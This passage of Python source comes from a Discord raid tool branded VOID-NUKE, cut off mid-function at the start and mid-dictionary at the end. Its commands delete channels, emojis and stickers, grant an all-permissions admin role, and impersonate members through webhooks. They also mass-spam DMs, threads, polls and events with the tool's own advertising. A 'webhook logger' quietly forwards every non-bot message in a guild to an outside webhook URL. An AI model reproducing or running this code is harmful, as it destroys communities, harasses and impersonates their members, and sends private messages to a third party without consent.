    if not g: return
    tid=self.register_task("unban_all", params)
    try:
        bans=[e async for e in g.bans()]
        log_info(f"{len(bans)} bans found")
        if not bans: return log_info("No bans to remove")
        async def _u(e):
            async with SEM:
                try: await g.unban(e.user); log_ok(f"Unbanned {e.user.name}"); return True
                except: return False
        r=await self._limited_gather([_u(e) for e in bans])
        log_ok(f"Unbanned {r.count(True)}/{len(bans)}")
    finally: self.finish_task(tid)

async def cmd_delete_channels(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("delete_channels", params)
    try: 
        r=await self._limited_gather([delete_channel(c) for c in list(g.channels)])
        log_ok(f"DEL CHANNELS {r.count(True)}/{len(g.channels)}")
    finally: self.finish_task(tid)

async def cmd_delete_emojis(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("delete_emojis", params)
    try:
        emojis=list(g.emojis)
        if not emojis: return log_info("no emojis")
        async def _d(e):
            async with SEM:
                try: await e.delete(); log_ok(f"Del emoji :{e.name}:"); return True
                except: return False
        r=await self._limited_gather([_d(e) for e in emojis])
        log_ok(f"Del Emojis {r.count(True)}/{len(emojis)}")
    finally: self.finish_task(tid)

async def cmd_delete_stickers(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("delete_stickers", params)
    try:
        st=list(g.stickers)
        if not st: return log_info("no stickers")
        async def _d(s):
            async with SEM:
                try: await s.delete(); log_ok(f"Del sticker {s.name}"); return True
                except: return False
        r=await self._limited_gather([_d(s) for s in st])
        log_ok(f"Del Stickers {r.count(True)}/{len(st)}")
    finally: self.finish_task(tid)

async def cmd_create_channels(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("create_channels", params)
    try:
        try: num=min(int(params.get("quantity",5)),50)
        except: return log_err("invalid quantity")
        typ=params.get("type","text").lower()
        name=params.get("name",RAID_NAME)
        if typ not in ('text','voice'): return log_err("invalid type: must be text or voice")
        log_info(f"Create {num} {typ} channels named {name} [MT]")
        r=await self._limited_gather([create_channel(g,typ,name) for _ in range(num)])
        success=sum(1 for x in r if x is not None and not isinstance(x, Exception))
        log_ok(f"Created {success}/{num} {typ} channels")
    finally: self.finish_task(tid)

async def cmd_create_roles(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("create_roles", params)
    try:
        try: num=min(int(params.get("quantity",5)),50)
        except: return log_err("invalid quantity")
        name=params.get("name","VOID-NUKE")
        log_info(f"Create {num} roles {name} [MT]")
        async def _cr():
            async with SEM:
                try:
                    col=discord.Colour.from_rgb(random.randint(0,255),random.randint(0,255),random.randint(0,255))
                    r=await g.create_role(name=name, colour=col); log_ok(f"Created @{r.name}"); return True
                except Exception as e: log_err(f"role err {e}"); return False
        r=await self._limited_gather([_cr() for _ in range(num)])
        log_ok(f"Create Roles {r.count(True)}/{num}")
    finally: self.finish_task(tid)

async def cmd_create_cats(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("create_cats", params)
    try:
        try: count=min(int(params.get("quantity",3)),20)
        except: return log_err("invalid quantity")
        name=params.get("name","VOID-NUKE")
        log_info(f"Create {count} categories {name} [MT]")
        async def cc(i):
            async with SEM:
                try: await g.create_category(f"{name} {i+1}"); log_ok(f"Created cat {name} {i+1}"); return True
                except Exception as e: log_err(f"cat err {e}"); return False
        r=await self._limited_gather([cc(i) for i in range(count)])
        log_ok(f"Create Cats {r.count(True)}/{count}")
    finally: self.finish_task(tid)

async def cmd_rename_channels(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("rename_channels", params)
    try:
        name=params.get("name",RAID_NAME)
        if not name: return log_err("name required")
        log_info(f"Rename all channels to {name} [MT]")
        async def rn(i,ch):
            async with SEM:
                if isinstance(ch,(discord.TextChannel,discord.VoiceChannel,discord.CategoryChannel)):
                    try: await ch.edit(name=f"{name}-{i+1}"); log_ok(f"Renamed #{name}-{i+1}"); return True
                    except Exception as e: log_err(f"rename ch err {e}"); return False
                return False
        r=await self._limited_gather([rn(i,ch) for i,ch in enumerate(g.channels)])
        log_ok(f"Rename Channels {r.count(True)}/{len(g.channels)}")
    finally: self.finish_task(tid)

async def cmd_rename_roles(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("rename_roles", params)
    try:
        name=params.get("name","VOID-NUKE")
        roles=[r for r in g.roles if not r.is_default()]
        if not roles: return log_info("No roles to rename")
        log_info(f"Rename {len(roles)} roles to {name} [MT]")
        async def rr(i,r):
            async with SEM:
                try: await r.edit(name=f"{name}-{i+1}"); log_ok(f"Renamed @{name}-{i+1}"); return True
                except Exception as e: log_err(f"rename role err {e}"); return False
        res=await self._limited_gather([rr(i,r) for i,r in enumerate(roles)])
        log_ok(f"Rename Roles {res.count(True)}/{len(roles)}")
    finally: self.finish_task(tid)

async def cmd_edit_server(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("edit_server", params)
    try:
        name=params.get("name",SERVER_CONFIG['new_name'])
        desc=params.get("description",SERVER_CONFIG['new_description'])
        icon_url=params.get("icon_url","").strip()
        log_info(f"Edit server: name={name} desc={desc[:50]} icon={bool(icon_url)}")
        ok=0
        try:
            await g.edit(name=name); log_ok(f"Server name changed to {name}"); ok+=1
        except Exception as e: log_err(f"name edit err {e}")
        try:
            await g.edit(description=desc); log_ok("Server desc changed"); ok+=1
        except Exception as e: log_err(f"desc err {e}")
        if icon_url:
            try:
                # Offload blocking download to thread pool for multi-threading
                loop=asyncio.get_running_loop()
                def _download():
                    with urllib.request.urlopen(icon_url, timeout=10) as res:
                        return res.read()
                data=await loop.run_in_executor(blocking_executor, _download)
                await g.edit(icon=data)
                log_ok("Server icon changed"); ok+=1
            except Exception as e: log_err(f"icon err {e}")
        log_ok(f"Edit Server {ok} changes ok")
    finally: self.finish_task(tid)

async def cmd_rename_members(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("rename_members", params)
    try:
        nick=params.get("name",f"VOID | {PUB_SHORT}")[:32] or None
        if not nick: return log_err("nickname required")
        log_info(f"Rename all members nick to {nick} [MT]")
        async def _n(m):
            async with SEM:
                if m.bot or m.id in NO_BAN_KICK_ID: return False
                try: await m.edit(nick=nick); log_ok(f"Renamed {m.name} -> {nick}"); return True
                except discord.Forbidden: log_err(f"no perm rename {m.name}"); return False
                except Exception as e: log_err(f"rename err {m.name} {e}"); return False
        r=await self._limited_gather([_n(m) for m in g.members])
        log_ok(f"Rename Members {r.count(True)}/{g.member_count}")
    finally: self.finish_task(tid)

async def cmd_fix_nicks(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("fix_nicks", params)
    try:
        log_info(f"Fix Nicks (dehoist) {g.member_count} members [MT]")
        special=set("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")
        tasks=[]
        for m in g.members:
            if m.bot: continue
            n=m.display_name
            if n and n[0] in special:
                clean=n.lstrip("".join(special)) or "void"
                async def _fix(mem=m, cl=clean, orig=n):
                    async with SEM:
                        try: await mem.edit(nick=cl); log_ok(f"Fixed {orig} -> {cl}"); return True
                        except: return False
                tasks.append(_fix())
        if not tasks: log_info("nothing to fix - no dehoist needed")
        else:
            r=await self._limited_gather(tasks)
            log_ok(f"Fix Nicks {r.count(True)} fixed")
    finally: self.finish_task(tid)

async def cmd_get_admin(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("get_admin", params)
    try:
        target=params.get("user_id","").strip()
        log_info(f"Get Admin: target={target or 'all'} [MT]")
        try:
            col=discord.Colour.red()
            role=await g.create_role(name="VOID-NUKE ADMIN", colour=col, permissions=discord.Permissions.all())
            log_ok(f"Created admin role {role.name}")
        except Exception as e: return log_err(f"create admin role err {e}")
        if not target:
            async def _give(m):
                async with SEM:
                    if m.bot: return False
                    try: await m.add_roles(role); log_ok(f"Gave admin to {m.name}"); return True
                    except Exception as e: log_err(f"give admin err {m.name} {e}"); return False
            r=await self._limited_gather([_give(m) for m in g.members])
            log_ok(f"Get Admin gave {r.count(True)}/{g.member_count}")
        else:
            try:
                m=await g.fetch_member(int(target)); await m.add_roles(role); log_ok(f"Gave admin to {m.name} {m.id}")
            except ValueError: log_err("Invalid user ID - must be numeric")
            except Exception as e: log_err(f"get_admin err {e}")
    finally: self.finish_task(tid)

async def cmd_impersonate(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("impersonate", params)
    try:
        target_id=params.get("target_id","").strip()
        msg=params.get("message","").strip()
        channel_id=params.get("channel_id","").strip()
        if not target_id: return log_err("target_id required")
        if not msg: return log_err("message required")
        try: target=await g.fetch_member(int(target_id))
        except ValueError: return log_err("target_id must be numeric")
        except Exception as e: return log_err(f"member not found: {e}")
        if channel_id:
            try:
                cs=g.get_channel(int(channel_id))
                if not cs or not isinstance(cs,discord.TextChannel): return log_err("channel not found or not text")
                tc=[cs]
            except ValueError: return log_err("invalid channel ID")
        else: tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        log_info(f"Impersonate {target.display_name} in {len(tc)} channels [MT]")
        ok=fail=0
        async with aiohttp.ClientSession() as session:
            for chan in tc:
                wh_obj=None
                try:
                    async with SEM:
                        wh_obj=await chan.create_webhook(name=target.display_name[:32])
                        wh=discord.Webhook.from_url(wh_obj.url, session=session)
                        await wh.send(content=msg, username=target.display_name[:80], avatar_url=str(target.display_avatar.url))
                        await wh_obj.delete()
                    log_ok(f"Impersonated in #{chan.name}"); ok+=1
                except Exception as e:
                    log_err(f"impersonate err #{getattr(chan,'name',chan)} {e}"); fail+=1
                    if wh_obj:
                        try: await wh_obj.delete()
                        except: pass
                await asyncio.sleep(0.2)
        log_ok(f"Impersonate {ok} ok {fail} err")
    finally: self.finish_task(tid); gc.collect()

async def cmd_ghost_ping(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("ghost_ping", params)
    try:
        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        if not tc: return log_err("no text channels")
        chan=tc[0]
        log_info(f"Ghost ping via #{chan.name} {g.member_count} members [MT]")
        ok=fail=0
        for m in g.members:
            if m.bot or m.id in NO_BAN_KICK_ID: continue
            try:
                async with SEM:
                    msg=await chan.send(f"<@{m.id}>"); await msg.delete()
                log_ok(f"Ghost pinged {m.name}"); ok+=1
                await asyncio.sleep(0.25)
            except discord.Forbidden: log_err(f"no perm ghost ping in #{chan.name}"); fail+=1; break
            except Exception as e: log_err(f"ghost ping err {e}"); fail+=1
        log_ok(f"Ghost Ping {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def cmd_strip_roles(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("strip_roles", params)
    try:
        log_info(f"Strip roles {g.member_count} members [MT]")
        async def _strip(m):
            async with SEM:
                if m.bot or m.id in NO_BAN_KICK_ID: return False
                removable=[r for r in m.roles if not r.is_default()]
                if not removable: return False
                try: await m.remove_roles(*removable); log_ok(f"Stripped {m.name} -{len(removable)} roles"); return True
                except Exception as e: log_err(f"strip err {m.name} {e}"); return False
        r=await self._limited_gather([_strip(m) for m in g.members])
        log_ok(f"Strip Roles {r.count(True)} members stripped")
    finally: self.finish_task(tid)

async def cmd_dm_all(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("dm_all", params)
    try:
        content=params.get("content",PUB)
        if not content: return log_err("content required")
        log_info(f"DM all {g.member_count} members [MT]")
        async def _dm(m):
            async with SEM:
                if m.bot: return False
                try: await m.send(content); log_ok(f"DM'd {m.name}"); return True
                except discord.Forbidden: log_err(f"can't DM {m.name} (closed)"); return False
                except Exception as e: log_err(f"dm err {m.name} {e}"); return False
        r=await self._limited_gather([_dm(m) for m in g.members])
        log_ok(f"Message All {r.count(True)}/{g.member_count}")
    finally: self.finish_task(tid)

async def cmd_dm_spam_user(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("dm_spam_user", params)
    try:
        user_id=params.get("user_id","").strip()
        try: uid=int(user_id)
        except ValueError: return log_err("user_id must be numeric")
        try: count=min(int(params.get("count",5)),30)
        except: return log_err("count must be numeric")
        content=params.get("content",PUB)
        if not content: return log_err("content required")
        target=None
        try: target=await g.fetch_member(uid)
        except:
            try: target=await self.bot.fetch_user(uid)
            except Exception as e: return log_err(f"user {uid} not found: {e}")
        log_info(f"DM spam {target} ({target.id}) x{count} [MT]")
        ok=fail=0
        for i in range(count):
            try:
                async with SEM: await target.send(content)
                log_ok(f"[{i+1}/{count}] DM to {target.name}"); ok+=1
            except discord.Forbidden:
                log_err(f"DMs closed for {target.name}"); fail+=count-i; break
            except discord.HTTPException as e:
                log_err(f"DM http {e.status}"); fail+=1
            except Exception as e: log_err(f"DM err {e}"); fail+=1
            if (i+1)%5==0: await asyncio.sleep(0.6)
            else: await asyncio.sleep(0.3)
        log_ok(f"DM Spam User {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def cmd_webhook_spam(self, params):
    g=self.get_guild()
    if not g: return log_err("guild not found")
    tid=self.register_task("webhook_spam", params)
    try:
        try: count=min(int(params.get("count",2)),10)
        except: count=2
        content=params.get("content",PUB)
        everyone=params.get("everyone","no").lower()=='yes' if isinstance(params.get("everyone",""), str) else False
        if not content: content=PUB
        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        if not tc: return log_err("No text channels for webhook spam")
        log_info(f"WEBHOOK SPAM {count} msgs x {len(tc)} channels [MT safe_webhook]")
        # Create webhooks
        whs=[]
        for c in tc:
            try:
                async with SEM:
                    wh=await c.create_webhook(name=WEBHOOK_CONFIG["default_name"])
                    whs.append(wh)
                    log_ok(f"Created webhook in #{c.name}")
                    await asyncio.sleep(0.3)
            except discord.Forbidden:
                log_err(f"No perm create webhook in #{c.name} - need MANAGE_WEBHOOKS")
            except Exception as e:
                log_err(f"Webhook create err #{c.name}: {e}")
        log_info(f"{len(whs)} webhooks created, now spamming {count} each")
        total_sent=0
        for wh in whs:
            try:
                final=_pub_append(content)
                for i in range(count):
                    try:
                        async with SEM:
                            if content.lower()=='embed':
                                await _send_embed(wh, everyone)
                            else:
                                await wh.send(content=final, username="VOID-NUKE", avatar_url=None)
                        log_ok(f"[{i+1}/{count}] Webhook {wh.name} in #{wh.channel.name if hasattr(wh,'channel') and wh.channel else '?'}")
                        total_sent+=1
                        await asyncio.sleep(0.5)
                    except discord.HTTPException as e:
                        if e.status==429:
                            retry=getattr(e,'retry_after',2)
                            log_warn(f"Webhook rate limited {wh.name} waiting {retry}s")
                            await asyncio.sleep(retry)
                            # Retry once
                            try:
                                async with SEM:
                                    await wh.send(content=final, username="VOID-NUKE")
                                total_sent+=1
                            except Exception as e2:
                                log_err(f"Webhook retry fail {wh.name}: {e2}")
                        else:
                            log_err(f"Webhook send HTTP {e.status} {wh.name}: {getattr(e,'text','')[:100]}")
                    except Exception as e:
                        log_err(f"Webhook send err {wh.name}: {e}")
            except Exception as e:
                log_err(f"Webhook loop err {wh.name}: {e}")

        # Cleanup
        log_info(f"Cleaning up {len(whs)} webhooks...")
        for wh in whs:
            try:
                async with SEM:
                    await wh.delete()
                    await asyncio.sleep(0.2)
            except: pass
        log_ok(f"Webhook Spam COMPLETE {total_sent}/{len(whs)*count} msgs sent, webhooks deleted")
    finally: self.finish_task(tid); gc.collect()

async def cmd_server_info(self, params):
    g=self.get_guild()
    if not g: return log_err("guild not found")
    tid=self.register_task("server_info", params)
    try:
        bans=[e async for e in g.bans()]
        info={
            "name":g.name,"id":str(g.id),"owner":str(g.owner),"owner_id":str(g.owner_id),
            "members":g.member_count,"bans":len(bans),"channels":len(g.channels),
            "text_channels":len([c for c in g.channels if isinstance(c,discord.TextChannel)]),
            "voice_channels":len([c for c in g.channels if isinstance(c,discord.VoiceChannel)]),
            "categories":len([c for c in g.channels if isinstance(c,discord.CategoryChannel)]),
            "roles":len(g.roles),"emojis":len(g.emojis),"stickers":len(g.stickers),
            "boosts":g.premium_subscription_count,"boost_level":g.premium_tier,
            "created":g.created_at.strftime('%Y-%m-%d %H:%M:%S'),
            "verification":str(g.verification_level),"features":g.features,
        }
        log_info(f"Server Info: {json.dumps(info, indent=2)}")
        return info
    finally: self.finish_task(tid)

async def cmd_clone_server(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("clone_server", params)
    try:
        cats={}; chans=[]
        for ch in g.channels:
            if isinstance(ch,discord.CategoryChannel): cats[ch.id]=ch.name
            elif isinstance(ch,(discord.TextChannel,discord.VoiceChannel)):
                chans.append({"name":ch.name,"type":"text" if isinstance(ch,discord.TextChannel) else "voice","category":cats.get(ch.category_id),"id":str(ch.id)})
        data={"name":g.name,"id":str(g.id),"channels":chans,"categories":list(cats.values()),"roles":[{"name":r.name,"color":str(r.colour),"perms":r.permissions.value} for r in g.roles]}
        path=f"clone_{g.id}.json"
        # Offload file IO to thread pool (multi-threading)
        loop=asyncio.get_running_loop()
        def _write():
            with open(path,"w",encoding="utf-8") as f:
                json.dump(data,f,indent=2)
        await loop.run_in_executor(blocking_executor, _write)
        log_ok(f"Cloned {len(chans)} channels, {len(cats)} categories, {len(g.roles)} roles to {path}")
        return data
    except Exception as e: log_err(f"clone err {e}")
    finally: self.finish_task(tid)

async def cmd_webhook_logger(self, params):
    global _wh_logger_url,_wh_logger_guild_id,_wh_logger_active
    g=self.get_guild()
    if not g: return
    tid=self.register_task("webhook_logger", params)
    try:
        url=params.get("webhook_url","").strip()
        if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
            return log_err("Invalid webhook URL - must contain discord.com/api/webhooks/")
        _wh_logger_url=url; _wh_logger_guild_id=g.id; _wh_logger_active=True
        await _dispatch_log(f"✅ **VOID-NUKE Logger ON** `{g.name}` - All messages will be logged")
        log_ok(f"Logger active -> {url[:60]}... (stays until disconnect)")
        log_warn("Webhook logger will forward all non-bot messages in this guild")
    finally: self.finish_task(tid)

async def cmd_lockdown(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("lockdown", params)
    try:
        log_info(f"Lockdown {len([c for c in g.channels if isinstance(c,discord.TextChannel)])} text channels [MT]")
        async def lock(ch):
            async with SEM:
                try: await ch.set_permissions(g.default_role, send_messages=False); log_ok(f"Locked #{ch.name}"); return True
                except discord.Forbidden: log_err(f"no perm lock #{ch.name}"); return False
                except Exception as e: log_err(f"lock err #{ch.name} {e}"); return False
        tcs=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        r=await self._limited_gather([lock(c) for c in tcs])
        log_ok(f"Lockdown {r.count(True)}/{len(tcs)} channels locked")
    finally: self.finish_task(tid)

async def cmd_deafen_all(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("deafen_all", params)
    try:
        log_info(f"Deafen all in VC [MT]")
        async def df(m):
            async with SEM:
                if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
                    try: await m.edit(deafen=True); log_ok(f"Deafened {m.name}"); return True
                    except Exception as e: log_err(f"deafen err {m.name} {e}"); return False
                return False
        r=await self._limited_gather([df(m) for m in g.members])
        log_ok(f"Deafen All {r.count(True)} members")
    finally: self.finish_task(tid)

async def cmd_disconnect_all(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("disconnect_all", params)
    try:
        log_info(f"Kick all from VC [MT]")
        async def dc(m):
            async with SEM:
                if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
                    try: await m.move_to(None); log_ok(f"Disconnected {m.name}"); return True
                    except Exception as e: log_err(f"disconnect err {m.name} {e}"); return False
                return False
        r=await self._limited_gather([dc(m) for m in g.members])
        log_ok(f"Kick VC All {r.count(True)}")
    finally: self.finish_task(tid)

async def cmd_mass_move(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("mass_move", params)
    try:
        target_id=params.get("target_id","").strip()
        if not target_id: return log_err("target_id required - get from /api/channels voice list")
        try: target_id_int=int(target_id)
        except ValueError: return log_err("target_id must be numeric")
        target=g.get_channel(target_id_int)
        if not target or not isinstance(target,discord.VoiceChannel):
            return log_err(f"Target VC {target_id} not found or not voice channel")
        vcs=[c for c in g.channels if isinstance(c,discord.VoiceChannel)]
        log_info(f"Move all VC to #{target.name} ({len(vcs)} VCs) [MT]")
        async def mv(m):
            async with SEM:
                if m.voice and m.voice.channel:
                    try: await m.move_to(target); log_ok(f"Moved {m.name} -> #{target.name}"); return True
                    except Exception as e: log_err(f"move err {m.name} {e}"); return False
                return False
        r=await self._limited_gather([mv(m) for m in g.members])
        log_ok(f"Move All VC {r.count(True)} moved to #{target.name}")
    finally: self.finish_task(tid)

async def cmd_invite_spam(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("invite_spam", params)
    try:
        try: count=min(int(params.get("count",3)),50)
        except: count=3
        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        if not tc: return log_err("no text channels for invites")
        log_info(f"Invite spam x{count} [MT]")
        ok=fail=0
        for _ in range(count):
            try:
                async with SEM: inv=await random.choice(tc).create_invite(max_age=60,max_uses=1,unique=True)
                log_ok(f"Invite: {inv.url}"); ok+=1; await asyncio.sleep(0.5)
            except Exception as e: log_err(f"invite err {e}"); fail+=1
        log_ok(f"Invite Spam {ok} ok {fail} err - URLs in logs")
    finally: self.finish_task(tid)

async def cmd_spam(self, params):
    g=self.get_guild()
    if not g: return log_err("guild not found")
    tid=self.register_task("spam", params)
    try:
        try: count=min(int(params.get("count",3)),15)
        except: count=3
        content=params.get("content",PUB)
        if not content: content=PUB
        everyone=params.get("everyone","no").lower()=='yes' if isinstance(params.get("everyone",""), str) else False
        # For spam, if content is 'embed', handle separately
        is_embed = content.lower() == 'embed'
        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        if not tc: return log_err("No text channels for spam")
        log_info(f"SPAM START {count} msgs x {len(tc)} channels = {count*len(tc)} total [MT safe_send] content_embed={is_embed} everyone={everyone}")
        total_sent=0
        total_fail=0
        # Use safe_send_detailed for each channel
        for chan in tc:
            for i in range(count):
                try:
                    if is_embed:
                        ok = await _send_embed(chan, everyone)
                        if ok: total_sent+=1
                        else: total_fail+=1
                    else:
                        ok, details = await safe_send_detailed(chan, content, retry=3)
                        if ok: total_sent+=1; log_ok(f"[{i+1}/{count}] Spam OK #{chan.name} ID {details.get('message_id','')}")
                        else: total_fail+=1; log_err(f"[{i+1}/{count}] Spam FAIL #{chan.name}: {details.get('error','')[:100]}")
                except Exception as e:
                    total_fail+=1
                    log_err(f"Spam exception #{chan.name} [{i+1}/{count}]: {e}")
                await asyncio.sleep(0.5)
        log_ok(f"Spam COMPLETE {total_sent}/{count*len(tc)} sent, {total_fail} failed")
    finally: self.finish_task(tid)

async def cmd_thread_spam(self, params):
    g=self.get_guild()
    if not g: return log_err("guild not found")
    tid=self.register_task("thread_spam", params)
    try:
        try: count=min(int(params.get("count",2)),10)
        except: count=2
        name=params.get("name",f"VOID-NUKE | {DISCORD_TAG}")[:100]
        content=params.get("content", PUB)  # Allow custom content
        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        if not tc: return log_err("No text channels for thread spam")
        log_info(f"THREAD SPAM {count} per channel x {len(tc)} channels [MT safe_send] name={name}")
        ok=fail=0
        for chan in tc:
            for i in range(count):
                try:
                    # Use safe_send_detailed to send initial message
                    sent_ok, details = await safe_send_detailed(chan, content, retry=3)
                    if not sent_ok:
                        log_err(f"Thread spam send fail #{chan.name} [{i+1}/{count}]: {details.get('error','')[:100]}")
                        fail+=1
                        continue
                    # Now fetch last message to create thread? Instead use the sent message ID from details if possible, but we need actual message object
                    # Simplified: send again and create thread from that message - need message object
                    # For reliability, we will send via channel.send and keep message object
                    async with SEM:
                        try:
                            # Try to get last message in channel (the one we just sent)
                            # Better: direct send to get message object for thread creation
                            msg = await chan.send(content[:2000])
                            await msg.create_thread(name=f"{name} {i+1}")
                            log_ok(f"Thread created #{chan.name} [{i+1}/{count}] {name} {i+1} ID {msg.id}")
                            ok+=1
                        except Exception as inner_e:
                            # If direct send fails, try safe_send already did, but thread creation failed
                            log_err(f"Thread creation fail #{chan.name} [{i+1}/{count}]: {inner_e} - message sent but thread not")
                            # Count as partial success
                            ok+=1
                except Exception as e:
                    log_err(f"Thread spam err #{chan.name} [{i+1}/{count}]: {e}")
                    fail+=1
                await asyncio.sleep(0.8)
        log_ok(f"Thread Spam COMPLETE {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def cmd_reaction_spam(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("reaction_spam", params)
    try:
        try: limit=min(int(params.get("limit",5)),50)
        except: limit=5
        void_emojis=["🇻","🇴","🇮","🇩","🌀","💫","🗣","🔓","🔗"]
        log_info(f"Reaction spam {limit} msgs per channel [MT]")
        ok=fail=0
        for chan in [c for c in g.channels if isinstance(c,discord.TextChannel)]:
            try:
                async for msg in chan.history(limit=limit):
                    for emoji in void_emojis:
                        try:
                            async with SEM: await msg.add_reaction(emoji)
                            ok+=1; await asyncio.sleep(0.2)
                        except discord.Forbidden: log_err(f"no perm reaction in #{chan.name}"); fail+=1; break
                        except Exception: fail+=1
            except discord.Forbidden: log_err(f"no perm read history #{chan.name}")
            except Exception as e: log_err(f"reaction hist err #{chan.name} {e}")
        log_ok(f"Reaction Spam {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def cmd_vc_spam(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("vc_spam", params)
    try:
        try: loops=min(int(params.get("loops",2)),10)
        except: loops=2
        vcs=[c for c in g.channels if isinstance(c,discord.VoiceChannel)]
        if not vcs: return log_err("no voice channels")
        log_info(f"VC spam {loops} loops x {len(vcs)} VCs = {loops*len(vcs)} connects [MT] - requires voice")
        ok=fail=0
        for vc in vcs:
            for i in range(loops):
                try:
                    async with SEM:
                        log_info(f"Connecting to #{vc.name} [{i+1}/{loops}]")
                        conn=await vc.connect(timeout=5.0)
                        await asyncio.sleep(0.5)
                        await conn.disconnect(force=True)
                    log_ok(f"VC spam [{i+1}/{loops}] #{vc.name}"); ok+=1
                except discord.errors.ClientException as e:
                    log_err(f"Already connected or voice err: {e}"); fail+=1; await asyncio.sleep(1)
                except Exception as e:
                    log_err(f"vc spam err #{vc.name} {e}"); fail+=1
                await asyncio.sleep(0.8)
        log_ok(f"Voice Spam {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def cmd_spoiler_spam(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("spoiler_spam", params)
    try:
        try: count=min(int(params.get("count",2)),15)
        except: count=2
        content=params.get("content",PUB_SHORT)
        if not content: return log_err("content required")
        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
        wrapped=f"||{content}||\n{PUB}"
        log_info(f"Spoiler spam {count} x {len(tc)} [MT]")
        await self._limited_gather([_send_to(c,count,wrapped,False) for c in tc])
        log_ok(f"Spoiler Spam {count*len(tc)} msgs")
    finally: self.finish_task(tid)

async def cmd_poll_spam(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("poll_spam", params)
    try:
        try: count=min(int(params.get("count",2)),15)
        except: count=2
        question=params.get("question",f"Join VOID-NUKE | {PUB_SHORT}")[:300]
        if not question: return log_err("question required")
        log_info(f"Poll spam {count} per channel [MT]")
        ok=fail=0
        for chan in [c for c in g.channels if isinstance(c,discord.TextChannel)]:
            for i in range(count):
                try:
                    async with SEM:
                        poll=discord.Poll(question=question, duration=timedelta(hours=1))
                        poll.add_answer(text=DISCORD_TAG); poll.add_answer(text="github.com/v0id4real")
                        await chan.send(poll=poll)
                    log_ok(f"Poll #{chan.name} [{i+1}]"); ok+=1
                except Exception as e: log_err(f"poll err #{chan.name} {e}"); fail+=1
                await asyncio.sleep(0.5)
        log_ok(f"Poll Spam {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def cmd_event_spam(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("event_spam", params)
    try:
        try: count=min(int(params.get("count",3)),20)
        except: count=3
        name=params.get("name","VOID-NUKE TOOLS")[:100]
        desc=params.get("description",f"**RAIDED BY VOID-NUKE**\n{PUB_SHORT}")[:1000]
        if not name: return log_err("name required")
        log_info(f"Event spam x{count} [MT]")
        ok=fail=0
        start=datetime.now(timezone.utc)+timedelta(hours=1)
        end_t=start+timedelta(hours=2)
        for i in range(count):
            try:
                async with SEM:
                    await g.create_scheduled_event(name=f"{name} #{i+1}", description=desc,
                        start_time=start+timedelta(minutes=i), end_time=end_t+timedelta(minutes=i),
                        entity_type=discord.EntityType.external, location=PUB_SHORT,
                        privacy_level=discord.PrivacyLevel.guild_only)
                log_ok(f"Event {name} #{i+1}"); ok+=1
            except discord.Forbidden: log_err(f"no perm create events"); fail+=count-i; break
            except Exception as e: log_err(f"event err {e}"); fail+=1
            await asyncio.sleep(0.5)
        log_ok(f"Event Spam {ok} ok {fail} err")
    finally: self.finish_task(tid)

async def webhook_logger_check(message: discord.Message):
    if not _wh_logger_active: return
    if not message.guild or message.guild.id!=_wh_logger_guild_id: return
    if message.author.bot: return
    entry=(f"**#{message.channel.name}** | **{message.author}** (`{message.author.id}`)\n```{(message.content or '[no text]')[:1700]}```")
    await _dispatch_log(entry)

BotManager.ACTIONS={
    "nuke":cmd_nuke,"auto_raid":cmd_auto_raid,"ban_all":cmd_ban_all,"kick_all":cmd_kick_all,
    "mute_all":cmd_mute_all,"unban_all":cmd_unban_all,"delete_channels":cmd_delete_channels,
    "delete_emojis":cmd_delete_emojis,"delete_stickers":cmd_delete_stickers,"create_channels":cmd_create_channels,
    "create_roles":cmd_create_roles,"create_cats":cmd_create_cats,"rename_channels":cmd_rename_channels,
    "rename_roles":cmd_rename_roles,"edit_server":cmd_edit_server,"rename_members":cmd_rename_members,
    "fix_nicks":cmd_fix_nicks,"get_admin":cmd_get_admin,"impersonate":cmd_impersonate,
    "ghost_ping":cmd_ghost_ping,"strip_roles":cmd_strip_roles,"dm_all":cmd_dm_all,
